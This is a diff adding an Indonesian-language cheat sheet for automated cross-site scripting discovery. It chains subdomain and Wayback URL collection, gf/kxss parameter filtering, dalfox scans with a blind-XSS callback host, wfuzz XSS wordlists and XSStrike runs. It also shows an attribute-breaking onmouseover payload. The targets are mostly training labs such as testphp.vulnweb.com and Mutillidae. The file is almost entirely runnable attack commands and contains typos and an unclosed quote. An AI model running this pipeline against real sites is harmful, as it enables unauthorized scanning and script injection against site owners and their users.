@@ -1,0 +1,89 @@
+#XSS Automation using Waybackurl And gf (Grep-Finding)
+
+#Tools:
+- GF
+- Waybackurls
+- GF pattern
+- anew
+- DALFOX
+- httpx
+#target
+- http://testphp.vulnweb.com/
+# cari subdomain
+$ subfinder -d hackerone.com -silent | httpx -title -tech-detect -status-code | anew subs
+# atau
+$ assetfinder -subs-only target.com | anew subs
+# gunakan httpx
+$ httpx -status-code -title -tech-detect -list subs
+# cari yang masih aktif dengan httpobe
+$ cat subs | htprobe | anew alive
+# Gunakan WaybackURL untuk mengambil URL untuk target,dan menyimpan output Anda dalam file vuln.txt.
+$ echo "testphp.vulnweb.com" | waybackurls | anew output-url.txt
+# Gunakan GF pattern untuk menemukan URL yang mengambil parameter XSS dengan
+$ cat output-url.txt | gf xss | sed 's/=.*/=/' | sed 's/URL: //' | anew xss-finding.txt
+# Sekarang saatnya DALFOX
+$ dalfox file xxs-finding.txt -H <custom header> -b 1amkaiz3n.xss.ht pipe
+
+
+# atau 
+
+$ echo “testphp.vulnweb.com” | waybackurls | tee test.txt
+$ cat test.txt | gf xss | sed 's/=.*/=/' | sed 's/URL: //' | tee -a xss-finding.txt
+$ dalfox file xss-finding.txt -b 1amkaiz3n.xss.ht pipe
+  
+#atau 
+# simpan hasil wayback ke testurl.txt
+
+$ cat testurl.txt | gf xss >> testxss.txt
+$ dalfox file testxss.txt pipe -b https://1amkaiz3n.xss.ht -F
+$ dalfox file testxss.txt pipe -b https://1amkaiz3n.xss.ht -F
+
+
+# atau
+
+# menemukan semua subdomain situs web
+$ assetfinder example.com >> all.txt
+# atau Anda dapat mengambil domain untuk mendapatkan output yang sesuai
+$ asetfinder example.com | grep example.com >> all.txt
+# Setelah menemukan semua subdomain, kita akan menemukan beberapa URL dari masa lalu yang ditangkap oleh waybackmachine
+$ cat all.txt | waybackurls >> url 
+#  Step 2 adalah tes terakhir pada aset menggunakan alat publik atau kami.
+$ cat url | kxss >> final_output
+# untuk filter hanya url nya saya
+$ cat final_output  | sed -En 's/^URL: (.*)/\1/p' | awk '{print $1}
+# sekarang di hasil akhir kita dapat melihat setiap parameter yang direfleksikan dan nilai yang tidak difilter.
+# tetapi bagaimana cara mengetahui mana yang memiliki kerentanan xss?
+
+#dalam beberapa kerentanan seperti xss , sqli , dan beberapa kasus dalam injeksi perintah kita dapat mematahkan string biasa .
+
+#mari kita lihat aksi xss untuk mengotomatisasi alat kami:
+
+#misalnya kami memiliki tag ini di sumber saat pengguna memasukkan test :
+<input type="text" value="test">
+#seperti yang Anda ketahui di situs web yang rentan jika pengguna memasukkan "test" di parameter input, refleksinya adalah:
+<input type="text" value="test"">
+#jadi untuk exploit kita bisa menggunakan payload ini " onmouseover="alert(9):
+<input type="text" value="test" onmouseover="alert(9)">
+
+# untuk pemutusan secara otomatis, kami dapat mengirim permintaan dengan () di akhir nilai parameter rentan dan memeriksa apakah responsnya adalah <parameter=nilai”> jika ya => Kemungkinan 90% rentan terhadap xss.
+# langkah terakhir, adalah untuk mengeksploitasi hasil akhir secara manual
+# langkah ini Anda perlu mengetahui javascript dan beberapa tip dan trik, karena biasanya ada banyak batasan, seperti: daftar hitam, kata-kata sensitif, batas panjang, penyaringan karakter operator (seperti '=' dalam beberapa kasus)& dll ...
+
+# atau 
+$ echo testphp.vulnweb.com | waybackurls | kxss | anew vuln
+
+
+
+
+#baru
+wfuzz -c -z file,/usr/share/wfuzz/wordlist/Injections/XSS.txt http://172.16.1.102/mutillidae/index.php?page=FUZZ
+wfuzz -c -z file,/usr/share/wfuzz/wordlist/Injections/XSS.txt,urlencode http://172.16.1.102/mutillidae/index.php?page=FUZZ
+python3 xsstrike.py -u http://172.16.1.102/mutillidae/index.php?page=dns-lookup.php
+python3 xsstrike.py -u http://172.16.1.102/mutillidae/index.php?page=dns-lookup.php --skip-dom
+python3 xsstrike.py -u http://172.16.1.102/mutillidae/index.php?page=dns-lookup.php --skip-dom --fuzzer -d 1
+
+
+
+
+
+
